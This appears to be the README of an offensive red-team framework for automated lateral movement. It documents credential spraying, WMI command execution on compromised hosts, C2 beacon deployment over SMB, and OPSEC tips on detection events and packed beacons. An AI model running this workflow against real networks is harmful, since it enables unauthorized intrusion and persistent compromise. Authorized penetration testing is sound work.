# Automated Lateral Movement Framework

A professional, modular Python framework for automated lateral movement during authorized penetration testing and red team operations.

> ⚠️ **LEGAL DISCLAIMER**: This tool is intended for authorized security testing only. Unauthorized access to computer systems is illegal. Always obtain written permission before testing.

## Features

- **Credential Testing**: Spray credentials across all targets
- **Access Matrix**: Track valid credential/target combinations
- **Chain Execution**: Execute commands on compromised systems
- **Beacon Deployment**: Deploy C2 beacons for persistence
- **Automated Campaigns**: Full automation from credentials to beacons
- **Comprehensive Reporting**: JSON reports with full audit trail
- **Modular Architecture**: Easy to extend and customize

## Installation

```bash
# Clone the repository
git clone https://github.com/maxwellcross/automated-lm-framework.git
cd automated-lm-framework

# Install dependencies
pip install -r requirements.txt
```

### Dependencies

- Python 3.8+
- CrackMapExec (for credential testing)
- Impacket (for WMI execution)
- smbclient (for beacon deployment)

## Quick Start

### Command Line

```bash
# Full automated campaign
python -m automated_lm_framework --targets hosts.txt --creds credentials.txt

# With beacon deployment
python -m automated_lm_framework --targets hosts.txt --creds credentials.txt --beacon beacon.exe

# Custom command execution
python -m automated_lm_framework --targets hosts.txt --creds credentials.txt --command "ipconfig /all"

# Credential testing only (no execution)
python -m automated_lm_framework --targets hosts.txt --creds credentials.txt --test-only
```

### Python API

```python
from automated_lm_framework import AutomatedLateralMovement, Credential

# Initialize framework
framework = AutomatedLateralMovement()

# Option 1: Manual workflow (more control)
targets = framework.load_targets("targets.txt")
credentials = framework.load_credentials("creds.txt")

# Test all credential combinations
matrix = framework.test_credentials()
print(f"Admin access on: {len(matrix.get_admin_access())} systems")

# Execute commands on compromised systems
chain = framework.execute_chain(matrix, "whoami /all")
print(f"Compromised: {chain.compromised_hosts}")

# Deploy beacons
deployments = framework.deploy_beacons(matrix, "beacon.exe")

# Generate report
framework.generate_report()

# Option 2: Automated campaign (simpler)
framework.auto_campaign(
    targets_file="targets.txt",
    creds_file="credentials.txt",
    beacon_path="beacon.exe",
    command="whoami"
)
```

## Input File Formats

### Targets File (targets.txt)

```
192.168.1.100
192.168.1.101
dc01.corp.local
# Comments are supported
192.168.1.102
```

### Credentials File (Text Format)

```
# Format: username:domain:secret
# Hash: 32 hex chars or LM:NT format
# Password: anything else

administrator:CORP:aad3b435b51404eeaad3b435b51404ee
svc_backup:CORP:Password123!
jsmith:.:LocalPassword
admin:DOMAIN:aad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee
```

### Credentials File (JSON Format)

```json
[
    {
        "username": "administrator",
        "domain": "CORP",
        "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee"
    },
    {
        "username": "svc_backup",
        "domain": "CORP",
        "password": "Password123!"
    }
]
```

## Workflow

### Phase 1: Credential Testing

Tests all credential combinations against all targets using CrackMapExec.

```python
matrix = framework.test_credentials(targets, credentials)

# Results
print(f"Total valid: {len(matrix.entries)}")
print(f"Admin access: {len(matrix.get_admin_access())}")
print(f"User access: {len(matrix.get_user_access())}")
```

Output: `access_matrix.json`

### Phase 2: Chain Execution

Executes commands on systems where we have access.

```python
chain = framework.execute_chain(matrix, "whoami")

# Results
print(f"Successful: {len(chain.get_successful_steps())}")
print(f"Compromised hosts: {chain.compromised_hosts}")
```

Output: `movement_chain.json`

### Phase 3: Beacon Deployment

Deploys C2 beacons to compromised systems.

```python
deployments = framework.deploy_beacons(matrix, "beacon.exe")

# Results
successful = sum(1 for d in deployments if d.success)
print(f"Deployed: {successful}/{len(deployments)}")
```

### Phase 4: Reporting

Generates comprehensive JSON reports.

```python
framework.generate_report()
```

Output: `lm_report_TIMESTAMP.json`

## Project Structure

```
automated_lm_framework/
├── __init__.py          # Package exports and version
├── __main__.py          # CLI entry point
├── core/
│   ├── __init__.py
│   ├── models.py        # Dataclasses and enums
│   └── framework.py     # Main orchestrator
├── operations/
│   ├── __init__.py
│   ├── credential_tester.py  # Credential spraying
│   ├── chain_executor.py     # Command execution
│   └── beacon_deployer.py    # Beacon deployment
├── reports/
│   ├── __init__.py
│   └── generator.py     # Report generation
└── utils/
    ├── __init__.py
    ├── output.py        # Console output handling
    ├── executor.py      # Command execution
    └── files.py         # File utilities
```

## OPSEC Considerations

### Credential Testing
- Multiple failed logins may trigger lockouts
- Event ID 4625 logs failed authentications
- Consider delay between attempts

### Chain Execution
- WMI creates processes on target
- Event ID 4688 logs process creation
- Consider command choice carefully

### Beacon Deployment
- Beacon lands on disk (`C:\Windows\Temp`)
- SMB file transfer is logged
- Consider obfuscated/packed beacons

### Detection Events

| Phase | Events |
|-------|--------|
| Credential Testing | 4625 (Logon Failure), 4624 (Success) |
| WMI Execution | 4688 (Process Creation), WMI logs |
| Beacon Copy | SMB audit logs |
| Beacon Exec | 4688, AV/EDR alerts |

## Extending the Framework

### Adding New Credential Tester

```python
# operations/custom_tester.py
from .credential_tester import CredentialTester

class CustomTester(CredentialTester):
    def _build_cme_command(self, target, credential):
        # Custom command building
        pass
```

### Adding New Execution Method

```python
# operations/custom_executor.py
from .chain_executor import ChainExecutor

class CustomExecutor(ChainExecutor):
    def _build_wmi_command(self, target, credential, command):
        # Custom execution method
        pass
```

## Output Examples

### Access Matrix (access_matrix.json)

```json
{
    "total_entries": 5,
    "admin_access": 3,
    "user_access": 2,
    "entries": [
        {
            "target": "192.168.1.100",
            "username": "administrator",
            "domain": "CORP",
            "access_level": "admin",
            "method": "smb"
        }
    ]
}
```

### Movement Chain (movement_chain.json)

```json
{
    "total_steps": 3,
    "successful_steps": 3,
    "compromised_hosts": ["192.168.1.100", "192.168.1.101"],
    "steps": [
        {
            "target": "192.168.1.100",
            "username": "administrator",
            "command": "whoami",
            "output": "corp\\administrator",
            "success": true
        }
    ]
}
```

## Author

**Maxwell Cross** - Red Team Operator & Security Researcher

## License

For authorized security testing only. See LICENSE for details.
